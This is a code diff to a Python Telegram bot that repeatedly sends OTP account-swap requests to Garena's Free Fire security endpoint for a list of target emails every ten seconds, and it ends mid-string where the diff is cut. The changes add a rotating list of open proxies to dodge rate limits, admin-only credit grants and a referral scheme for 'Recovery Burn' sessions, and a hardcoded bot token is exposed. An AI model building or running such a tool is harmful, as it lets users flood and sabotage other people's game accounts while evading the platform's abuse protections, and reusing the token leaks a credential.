@@ -15,16 +15,33 @@ from telegram.ext import (
 )
 
 BOT_TOKEN = "8776921304:AAGRrWDoNy5WWib5V3_wkIlZD_nEttflvDc"
+ADMIN_ID = 7373420615  # 👑 تم تعيين معرف المطور الخاص بك هنا
+
 OTP_URL = "https://100067.connect.garena.com/game/account_security/swap:send_otp"
 INIT_URL = "https://100067.connect.garena.com/game/account_security/"
 
-# قائمة بروكسيات (تستخدم كاحتياطي فقط)
+# قائمة بروكسيات موسعة
 PROXY_LIST = [
     "http://43.134.20.79:3128",
     "http://47.251.43.113:8080",
     "http://8.219.97.248:80",
     "http://103.152.112.162:80",
-    "http://198.23.239.134:80"
+    "http://198.23.239.134:80",
+    "http://20.205.61.143:80",
+    "http://47.254.153.183:80",
+    "http://8.219.175.110:80",
+    "http://161.35.70.249:8080",
+    "http://165.22.254.40:8080",
+    "http://138.68.60.8:8080",
+    "http://206.189.144.184:8080",
+    "http://64.225.8.121:8080",
+    "http://159.65.133.197:8080",
+    "http://167.99.234.199:8080",
+    "http://139.59.1.139:8080",
+    "http://104.248.63.15:8080",
+    "http://157.245.92.194:8080",
+    "http://178.128.89.177:8080",
+    "http://143.198.228.250:8080"
 ]
 
 ALGIERS_TZ = ZoneInfo("Africa/Algiers")
@@ -38,17 +55,39 @@ logging.basicConfig(
     level=logging.INFO
 )
 
-target_emails = []
+target_emails = []  # قائمة الإيميلات
 is_running = False
 active_chat_id = None
 scheduler_task = None
 waiting_for_email_input = False
+waiting_for_admin_credit_input = False
 
-user_referrals = {}
-referred_by = {}
-user_burn_credits = {}
+# Proxy Rotation Control (تغيير البروكسي كل طلبين)
+current_proxy = None
+request_counter = 0
+
+# Referral & Credits System
+user_referrals = {}    # {user_id: count}
+referred_by = {}       # {user_id: referrer_id}
+user_burn_credits = {} # {user_id: credits_count}
 
 REQUIRED_REFERRALS_PER_BURN = 5
+
+def get_rotated_proxy():
+    global current_proxy, request_counter
+    if not PROXY_LIST:
+        return None
+    
+    if current_proxy is None or request_counter >= 2:
+        proxy_url = random.choice(PROXY_LIST)
+        current_proxy = {
+            "http": proxy_url,
+            "https": proxy_url
+        }
+        request_counter = 0
+    
+    request_counter += 1
+    return current_proxy
 
 def execute_garena_request(email: str) -> tuple[bool, str]:
     session = requests.Session()
@@ -61,38 +100,31 @@ def execute_garena_request(email: str) -> tuple[bool, str]:
         "Accept-Encoding": "gzip"
     }
     
-    payload = {
-        "app_id": "100067",
-        "email": email,
-        "locale": "en_DZ"
-    }
-
-    # محاولة الإرسال المباشر أولاً (Direct Request)
+    proxies = get_rotated_proxy()
+    
     try:
-        session.get(INIT_URL, headers=headers, timeout=8)
-        response = session.post(OTP_URL, headers=headers, data=payload, timeout=10)
-        if response.status_code == 200 and ('"result":0' in response.text or '"result": 0' in response.text):
-            return True, response.text
-    except Exception:
-        pass
-
-    # في حال فشل الاتصال المباشر، يتم تجربة البروكسي
-    if PROXY_LIST:
-        proxy_url = random.choice(PROXY_LIST)
-        proxies = {"http": proxy_url, "https": proxy_url}
-        try:
-            session.get(INIT_URL, headers=headers, proxies=proxies, timeout=8)
-            response = session.post(OTP_URL, headers=headers, data=payload, proxies=proxies, timeout=10)
-            if response.status_code == 200 and ('"result":0' in response.text or '"result": 0' in response.text):
+        session.get(INIT_URL, headers=headers, proxies=proxies, timeout=10)
+        payload = {
+            "app_id": "100067",
+            "email": email,
+            "locale": "en_DZ"
+        }
+        response = session.post(OTP_URL, headers=headers, data=payload, proxies=proxies, timeout=15)
+        if response.status_code == 200:
+            if '"result":0' in response.text or '"result": 0' in response.text:
                 return True, response.text
             else:
                 return False, f"Server response: {response.text}"
-        except Exception as err:
-            return False, f"Proxy Connection Error: {str(err)}"
+        else:
+            return False, f"Server error status: {response.status_code} - {response.text}"
+    except requests.exceptions.Timeout:
+        return False, "Connection timeout (Proxy or Server)."
+    except requests.exceptions.ConnectionError:
+        return False, "Network connection failed (Proxy Error)."
+    except Exception as err:
+        return False, f"Error: {str(err)}"
 
-    return False, "Failed via Direct & Proxy attempts."
-
-def build_main_menu() -> InlineKeyboardMarkup:
+def build_main_menu(user_id: int) -> InlineKeyboardMarkup:
     burn_button_text = "🛑 Stop Recovery Burn" if is_running else "Start Recovery Burn🔥"
     burn_callback = "btn_stop_burn" if is_running else "btn_start_burn"
     
@@ -105,6 +137,11 @@ def build_main_menu() -> InlineKeyboardMarkup:
         [InlineKeyboardButton(burn_button_text, callback_data=burn_callback)],
         [InlineKeyboardButton("👥 Referral System", callback_data="btn_referral")]
     ]
+    
+    # زر خاص بك بصفتك المطور فقط
+    if user_id == ADMIN_ID:
+        keyboard.append([InlineKeyboardButton("⚡ Admin: Add Credits", callback_data="btn_admin_add_credits")])
+
     return InlineKeyboardMarkup(keyboard)
 
 def build_delete_menu() -> InlineKeyboardMarkup:
@@ -195,8 +232,9 @@ async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     except Exception as err:
                         logging.error(f"Failed to notify referrer: {err}")
 
+    admin_tag = " (👑 Admin)" if user_id == ADMIN_ID else ""
     welcome_text = (
-        "⚙️ **Free Fire Automated OTP Dispatcher**\n\n"
+        f"⚙️ **Free Fire Automated OTP Dispatcher**{admin_tag}\n\n"
         "• **Schedule:** Every day from 04:00 AM to 06:00 AM (Algeria Time)\n"
         "• **Interval:** Every 10 seconds per email\n"
         "• **Max Emails Allowed:** Up to 5 Emails\n\n"
@@ -204,12 +242,45 @@ async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     await update.message.reply_text(
         welcome_text,
-        reply_markup=build_main_menu(),
+        reply_markup=build_main_menu(user_id),
         parse_mode="Markdown"
     )
 
+async def add_credits_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """أمر مباشر للمطور لإضافة رصيد: /add <user_id> <amount>"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_ID:
+        await update.message.reply_text("⛔ **Access Denied!** Admin only command.")
+        return
+
+    if len(context.args) < 2:
+        await update.message.reply_text("⚠️ **Usage:** `/add <user_id> <amount>`", parse_mode="Markdown")
+        return
+
+    try:
+        target_id = int(context.args[0])
+        amount = int(context.args[1])
+        user_burn_credits[target_id] = user_burn_credits.get(target_id, 0) + amount
+        
+        await update.message.reply_text(
+            f"✅ **Success!** Added `{amount}` credits to user `{target_id}`.\n"
+            f"Current Total: `{user_burn_credits[target_id]}`",
+            parse_mode="Markdown"
+        )
+        
+        try:
+            await context.bot.send_message(
+                chat_id=target_id,
+                text=f"🎉 **Admin Grant!** You have received `{amount}` Recovery Burn credits."
+            )
+        except Exception as err:
+            logging.error(f"Failed to notify target user: {err}")
+
+    except ValueError:
+        await update.message.reply_text("⚠️ Please enter valid numeric values.")
+
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global is_running, target_emails, active_chat_id, scheduler_task, waiting_for_email_input
+    global is_running, target_emails, active_chat_id, scheduler_task, waiting_for_email_input, waiting_for_admin_credit_input
     query = update.callback_query
     await query.answer()
     active_chat_id = update.effective_chat.id
@@ -218,7 +289,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if query.data == "btn_main_menu":
         await query.edit_message_text(
             "⚙️ **Main Menu:**",
-            reply_markup=build_main_menu(),
+            reply_markup=build_main_menu(user_id),
             parse_mode="Markdown"
         )
 
@@ -226,7 +297,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if len(target_emails) >= MAX_EMAILS:
             await query.edit_message_text(
                 f"⚠️ **Limit Reached!** You can only add up to {MAX_EMAILS} emails.",
-                reply_markup=build_main_menu(),
+                reply_markup=build_main_menu(user_id),
                 parse_mode="Markdown"
             )
             return
@@ -241,7 +312,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not target_emails:
             await query.edit_message_text(
                 "❌ **No emails added yet.** Use '➕ Add Email' to add emails.",
-                reply_markup=build_main_menu(),
+                reply_markup=build_main_menu(user_id),
                 parse_mode="Markdown"
             )
             return
@@ -253,7 +324,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         await query.edit_message_text(
             text,
-            reply_markup=build_main_menu(),
+            reply_markup=build_main_menu(user_id),
             parse_mode="Markdown"
         )
 
@@ -261,7 +332,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not target_emails:
             await query.edit_message_text(
                 "⚠️ **No emails available to delete!**",
-                reply_markup=build_main_menu(),
+                reply_markup=build_main_menu(user_id),
                 parse_mode="Markdown"
             )
             return
@@ -291,7 +362,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             else:
                 await query.edit_message_text(
                     f"🗑️ Deleted: `{removed}`\n\nAll emails have been removed.",
-                    reply_markup=build_main_menu(),
+                    reply_markup=build_main_menu(user_id),
                     parse_mode="Markdown"
                 )
 
@@ -299,37 +370,41 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not target_emails:
             await query.edit_message_text(
                 "❌ **No target emails set!** Please click '➕ Add Email' first.",
-                reply_markup=build_main_menu(),
-                parse_mode="Markdown"
-            )
-            return
-            
-        credits = user_burn_credits.get(user_id, 0)
-        if credits <= 0:
-            total_refs = user_referrals.get(user_id, 0)
-            needed = REQUIRED_REFERRALS_PER_BURN - (total_refs % REQUIRED_REFERRALS_PER_BURN)
-            await query.edit_message_text(
-                f"⚠️ **Access Denied! You do not have enough Recovery Burn Credits.**\n\n"
-                f"• Every **5 referrals** = **1 Recovery Burn Session**\n"
-                f"• Current Referrals: `{total_refs}`\n"
-                f"• Referrals needed: `{needed}` more\n\n"
-                f"Share your link via '👥 Referral System' to earn credits!",
-                reply_markup=build_main_menu(),
+                reply_markup=build_main_menu(user_id),
                 parse_mode="Markdown"
             )
             return
 
-        user_burn_credits[user_id] -= 1
+        # صلاحيات المطور لا تستهلك نقاطاً
+        if user_id != ADMIN_ID:
+            credits = user_burn_credits.get(user_id, 0)
+            if credits <= 0:
+                total_refs = user_referrals.get(user_id, 0)
+                needed = REQUIRED_REFERRALS_PER_BURN - (total_refs % REQUIRED_REFERRALS_PER_BURN)
+                await query.edit_message_text(
+                    f"⚠️ **Access Denied! You do not have enough Recovery Burn Credits.**\n\n"
+                    f"• Every **5 referrals** = **1 Recovery Burn Session**\n"
+                    f"• Current Referrals: `{total_refs}`\n"
+                    f"• Referrals needed: `{needed}` more\n\n"
+                    f"Share your link via '👥 Referral System' to earn credits!",
+                    reply_markup=build_main_menu(user_id),
+                    parse_mode="Markdown"
+                )
+                return
+            user_burn_credits[user_id] -= 1
+
         is_running = True
         scheduler_task = asyncio.create_task(scheduled_dispatcher_loop(context))
         emails_str = ", ".join([f"`{e}`" for e in target_emails])
+        
+        rem_credits_text = "∞ (Admin Unlimited)" if user_id == ADMIN_ID else f"`{user_burn_credits.get(user_id, 0)}`"
         await query.edit_message_text(
             f"🚀 **Automation Scheduled!**\n"
             f"📧 Targets ({len(target_emails)}): {emails_str}\n"
             f"🕒 Active Window: 04:00 AM - 06:00 AM (Algeria Time)\n"
             f"⏱️ Interval: Every 10 seconds per email\n"
-            f"🎫 Remaining Burn Credits: `{user_burn_credits[user_id]}`",
-            reply_markup=build_main_menu(),
+            f"🎫 Remaining Burn Credits: {rem_credits_text}",
+            reply_markup=build_main_menu(user_id),
             parse_mode="Markdown"
         )
 
@@ -337,7 +412,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not is_running:
             await query.edit_message_text(
                 "⚠️ **Automation is not active.**",
-                reply_markup=build_main_menu(),
+                reply_markup=build_main_menu(user_id),
                 parse_mode="Markdown"
             )
             return
@@ -349,7 +424,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             
         await query.edit_message_text(
             "🛑 **Automation stopped successfully.**",
-            reply_markup=build_main_menu(),
+            reply_markup=build_main_menu(user_id),
             parse_mode="Markdown"
         )
 
@@ -357,7 +432,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         bot_username = (await context.bot.get_me()).username
         referral_link = f"https://t.me/{bot_username}?start={user_id}"
         total_refs = user_referrals.get(user_id, 0)
-        credits = user_burn_credits.get(user_id, 0)
+        credits = "∞ (Admin)" if user_id == ADMIN_ID else str(user_burn_credits.get(user_id, 0))
         progress = total_refs % REQUIRED_REFERRALS_PER_BURN
         
         ref_text = (
@@ -371,18 +446,62 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         await query.edit_message_text(
             ref_text,
-            reply_markup=build_main_menu(),
+            reply_markup=build_main_menu(user_id),
+            parse_mode="Markdown"
+        )
+
+    elif query.data == "btn_admin_add_credits":
+        if user_id != ADMIN_ID:
+            await query.answer("⛔ Access denied!", show_alert=True)
+            return
+
+        waiting_for_admin_credit_input = True
+        await query.edit_message_text(
+            "⚡ **Admin Mode: Add Credits**\n\n"
+            "Please send the user ID and credit amount in this format:\n"
+            "`<user_id> <amount>`\n\n"
+            "Example: `123456789 5`",
             parse_mode="Markdown"
         )
 
 async def text_message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global target_emails, waiting_for_email_input
+    global target_emails, waiting_for_email_input, waiting_for_admin_credit_input
+    user_id = update.effective_user.id
+
+    if user_id == ADMIN_ID and waiting_for_admin_credit_input:
+        text = update.message.text.strip().split()
+        if len(text) == 2 and text[0].isdigit() and text[1].lstrip('-').isdigit():
+            target_id = int(text[0])
+            amount = int(text[1])
+            user_burn_credits[target_id] = user_burn_credits.get(target_id, 0) + amount
+            waiting_for_admin_credit_input = False
+
+            await update.message.reply_text(
+                f"✅ Added `{amount}` credits to user `{target_id}`.\n"
+                f"New Balance: `{user_burn_credits[target_id]}`",
+                reply_markup=build_main_menu(user_id),
+                parse_mode="Markdown"
+            )
+            try:
+                await context.bot.send_message(
+                    chat_id=target_id,
+                    text=f"🎉 **Admin Grant!** You have received `{amount}` Recovery Burn credits."
+                )
+            except Exception as err:
+                logging.error(f"Failed to notify user: {err}")
+        else:
+            await update.message.reply_text(
+                "⚠️ Invalid format. Please use: `<user_id> <amount>`\nExample: `123456789 5`",
+                parse_mode="Markdown"
+            )
+        return
+
     if waiting_for_email_input:
         new_email = update.message.text.strip()
         if new_email in target_emails:
             await update.message.reply_text(
                 f"⚠️ Email `{new_email}` is already in the list!",
-                reply_markup=build_main_menu(),
+                reply_markup=build_main_menu(user_id),
                 parse_mode="Markdown"
             )
         else:
@@ -390,19 +509,9 @@ async def text_message_handler(update: Update, context: ContextTypes.DEFAULT_TYP
             waiting_for_email_input = False
             await update.message.reply_text(
                 f"🎯 Added: `{new_email}`\nTotal Emails: `{len(target_emails)}/{MAX_EMAILS}`",
-                reply_markup=build_main_menu(),
+                reply_markup=build_main_menu(user_id),
                 parse_mode="Markdown"
             )
     else:
         await update.message.reply_text(
-            "Please use the buttons below to interact with the bot:",
-            reply_markup=build_main_menu()
-        )
-
-if __name__ == "__main__":
-    app = ApplicationBuilder().token(BOT_TOKEN).build()
-    app.add_handler(CommandHandler("start", start_cmd))
-    app.add_handler(CallbackQueryHandler(button_handler))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_message_handler))
-    print("Bot is up and running...")
-    app.run_polling()
+            "Please use the buttons below to intera
